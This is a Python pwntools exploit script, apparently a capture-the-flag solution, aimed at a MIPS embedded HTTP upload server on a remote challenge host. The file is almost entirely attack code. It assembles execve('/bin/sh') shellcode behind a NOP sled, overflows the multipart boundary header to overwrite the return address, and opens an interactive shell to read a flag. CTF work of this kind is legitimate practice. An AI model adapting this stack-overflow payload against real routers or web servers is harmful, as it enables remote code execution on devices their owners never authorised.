from pwn import *

context.update(arch='mips', os='linux', bits=32, endian='big')
elfexe = ELF('./binary')
context.binary = elfexe

shellcode = asm('''
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
''')
print(shellcode)

nop_sled = asm(shellcraft.nop())
print(nop_sled)

shellcode = nop_sled * 400 + shellcode

def start(argv=[], *a, **kw):
    if args.GDB:
        target = process(['./qemu-mips', '-L', './', '-g', '12345', './binary'])
        sleep(0.5)
        gdbscript_lines = []
        for line in gdbscript.splitlines():
            if (line := line.strip()):
                gdbscript_lines.append('-ex')
                gdbscript_lines.append(line)
        subprocess.Popen([
            'gnome-terminal',
            '--',
            'gdb-multiarch',
            *gdbscript_lines
        ])
    else:
        # target = process(['./qemu-mips', '-L', './', './binary'])
        target = remote('challenge.ctf.uscybergames.com', '54319')
        # target = remote('localhost', '1341')
    return target

# for offset in range(0x1000, 0x3000, 4):
gdbscript = '''
set arch mips:isa32r2
file ./binary
target remote localhost:12345
b uh_tcp_recv_file
b uh_http_header_recv
brva 0x3ddc
brva 0x3db4
brva 0x8de4
brva 0x9010
b uh_get_postdata_withupload
c
'''

arguments = []
r = start(arguments, gdbscript)
offset = 1
boundary_addr = 0x40000000 
boundary_addr = 0x3fffe7e4 + 0x300
boundary = b'A' * 192
boundary += p32(boundary_addr) # ra
boundary += p32(0x4003e2d0)
boundary += shellcode

# boundary = b'AA'

webrequest = b'''POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=BOUNDARY_PLACEHOLDER
Content-Length: CONTENT_LENGTH

'''.replace(b'BOUNDARY_PLACEHOLDER', boundary)

body = b'''--BOUNDARY_PLACEHOLDER
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

AAAA
--BOUNDARY_PLACEHOLDER--

'''.replace(b'BOUNDARY_PLACEHOLDER', boundary).replace(b'\n', b'\r\n')

webrequest = webrequest.replace(b'\n', b'\r\n') + body
webrequest = webrequest.replace(b'CONTENT_LENGTH', str(len(body)).encode())
# input('dbg?')
try:
    r.sendline(webrequest)
    # r.interactive()
    # r.sendline(b'ls')
    # r.sendline(b'cat flag.txt')
    # r.recvuntil(b'flag.txt')
    r.interactive()
    # print(flag.decode())
    # r.close()
    # break
except EOFError:
    print('EOFError, trying next offset:', hex(offset))
    r.close()